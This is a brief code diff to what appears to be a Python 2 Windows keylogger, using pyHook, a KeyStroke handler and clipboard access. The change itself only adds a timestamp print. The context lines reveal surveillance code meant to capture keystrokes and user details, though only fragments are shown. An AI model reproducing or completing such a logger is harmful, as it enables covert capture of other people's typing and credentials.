@@ -3,6 +3,7 @@ import pythoncom
 import pyHook 
 import win32clipboard
 import getpass
+import time
 
 user32   = windll.user32
 kernel32 = windll.kernel32
@@ -70,6 +71,7 @@ def KeyStroke(event):
     return True
 
 print "User: %s" % user_info
+print (time.strftime("%d/%m/%Y - %H:%M:%S"))
 print
 
 # create and register a hook manager 
